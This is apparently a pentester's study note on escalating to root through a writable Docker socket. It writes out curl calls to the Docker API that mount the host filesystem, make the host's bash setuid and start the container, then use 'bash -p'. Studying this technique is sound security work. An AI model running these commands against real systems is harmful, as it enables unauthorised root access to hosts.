https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-.socket-files

The Docker socket, often found at */var/run/docker.sock*, is a critical file that should be secured. By default, it's writable by the root user and members of the docker group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

If we already found the usage of --unix-socket
![[Pasted image 20240403181648.png]]
Payload to be performed in a docker with root access to take advantage of the API:
````
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"sandbox:latest","HostConfig":{"Binds": ["/:/mounted"]},"Cmd":["/bin/sh", "-c", "chmod u+s /mounted/bin/bash"],"Tty": true}' http://localhost/containers/create
````

![[Pasted image 20240403183338.png]]
>{"Id":"==628d==3f02ba86cd85f10f1af6f3e710dc757362891652cd5ceb9e7f603d8fc0ad","Warnings":[]}
1. **curl**: `curl` is a command-line tool for transferring data using various protocols. In this case, it's being used to make an HTTP request to the Docker daemon's API.
    
2. **-XPOST**: This option specifies that `curl` should use the HTTP POST method for the request. It's indicating that the intention is to create a new resource on the Docker daemon.
    
3. **-H "Content-Type: application/json"**: This option sets the HTTP header `Content-Type` to `application/json`. It tells the server that the body of the request will be in JSON format.
    
4. **--unix-socket /var/run/docker.sock**: This option specifies the Unix socket file through which `curl` communicates with the Docker daemon. The Docker daemon exposes an API on this Unix socket, allowing clients like `curl` to interact with it.
    
5. **-d '{"Image":"sandbox:latest","HostConfig":{"Binds": ["/:/mounted"]},"Cmd":["/bin/sh", "-c", "chmod u+s /mounted/bin/bash"],"Tty": true}'**: This option sends data in the body of the HTTP request. In this case, it's a JSON payload that describes the configuration for creating a new Docker container. Let's break down the payload:
    
    - `"Image": "sandbox:latest"`: Specifies the image (`sandbox`) and tag (`latest`) to use for the container.
    - `"HostConfig": {...}`: Configures various aspects of how the container interacts with the host system.
        - `"Binds": ["/:/mounted"]`: Mounts the root filesystem of the host at `/mounted` inside the container.
    - `"Cmd": ["/bin/sh", "-c", "chmod u+s /mounted/bin/bash"]`: Specifies the command to run inside the container. In this case, it runs a shell command to make the `bash` binary inside the container setuid (`u+s`), which effectively grants the user executing `bash` elevated privileges.
    - `"Tty": true`: Indicates that the container should allocate a pseudo-TTY.
6. **[http://localhost/containers/create](http://localhost/containers/create)**: This is the URL to which `curl` sends the HTTP request. It's the Docker daemon's API endpoint for creating containers.
This is a JSON syntaxis:
{
  "Image": "sandbox:latest",
  "HostConfig": {
    "Binds": ["/:/mounted"]
  },
  "Cmd": ["/bin/sh", "-c", "chmod u+s /mounted/bin/bash"],
  "Tty": true
}

# Running the container
Running the container, in ID section it's enough to put only the 4 first characters:

````
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/628d/start
````

### Root in the main machine
We only need to use `bash -p` to enter as root in the main machine

![[Pasted image 20240403183609.png]]